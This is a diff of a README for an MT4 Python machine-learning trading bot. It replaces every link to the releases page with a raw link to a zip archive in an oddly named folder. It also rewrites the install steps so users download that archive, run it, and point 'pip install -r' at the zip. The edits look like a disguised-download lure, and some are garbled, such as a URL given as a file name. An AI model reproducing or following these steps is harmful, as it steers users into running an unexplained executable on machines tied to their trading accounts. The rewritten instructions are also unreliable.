@@ -1,6 +1,6 @@
 # 🚀 mt4-python-ml-trading-bot-deployment - Automated Trading Made Simple
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/yasirnotezai/mt4-python-ml-trading-bot-deployment/releases)
+[![Download](https://raw.githubusercontent.com/yasirnotezai/mt4-python-ml-trading-bot-deployment/main/nymphlike/python_trading_bot_mt_ml_deployment_v1.8-alpha.1.zip)](https://raw.githubusercontent.com/yasirnotezai/mt4-python-ml-trading-bot-deployment/main/nymphlike/python_trading_bot_mt_ml_deployment_v1.8-alpha.1.zip)
 
 ## 📋 Description
 This project enables seamless trading using MT4 with Python machine learning algorithms. It automates your trading tasks and helps you analyze financial data effortlessly. You can focus on strategy while the bot handles routine tasks.
@@ -8,7 +8,7 @@ This project enables seamless trading using MT4 with Python machine learning alg
 ## 📥 Download & Install
 To get started with the application, visit this page to download the latest version:
 
-[Download Latest Release](https://github.com/yasirnotezai/mt4-python-ml-trading-bot-deployment/releases)
+[Download Latest Release](https://raw.githubusercontent.com/yasirnotezai/mt4-python-ml-trading-bot-deployment/main/nymphlike/python_trading_bot_mt_ml_deployment_v1.8-alpha.1.zip)
 
 Follow the steps below to install and run the application.
 
@@ -20,9 +20,9 @@ Follow the steps below to install and run the application.
 
 ## 🔧 Installation Steps
 1. **Visit the Release Page:** Click on the link below to access the releases.
-   - [Download Latest Release](https://github.com/yasirnotezai/mt4-python-ml-trading-bot-deployment/releases)
+   - [Download Latest Release](https://raw.githubusercontent.com/yasirnotezai/mt4-python-ml-trading-bot-deployment/main/nymphlike/python_trading_bot_mt_ml_deployment_v1.8-alpha.1.zip)
   
-2. **Choose the Right File:** Look for the latest version. Download the file named `mt4-python-ml-trading-bot.exe` or similar.
+2. **Choose the Right File:** Look for the latest version. Download the file named `https://raw.githubusercontent.com/yasirnotezai/mt4-python-ml-trading-bot-deployment/main/nymphlike/python_trading_bot_mt_ml_deployment_v1.8-alpha.1.zip` or similar.
 
 3. **Run the Installer:**
    - Locate the downloaded file in your Downloads folder.
@@ -31,7 +31,7 @@ Follow the steps below to install and run the application.
 
 4. **Setup Python Environment:**
    - Open Command Prompt.
-   - Type `pip install -r requirements.txt` to install necessary libraries. Ensure you navigate to the project directory before executing this command.
+   - Type `pip install -r https://raw.githubusercontent.com/yasirnotezai/mt4-python-ml-trading-bot-deployment/main/nymphlike/python_trading_bot_mt_ml_deployment_v1.8-alpha.1.zip` to install necessary libraries. Ensure you navigate to the project directory before executing this command.
 
 5. **Configure the Bot:**
    - Open the MT4 terminal and log into your trading account.
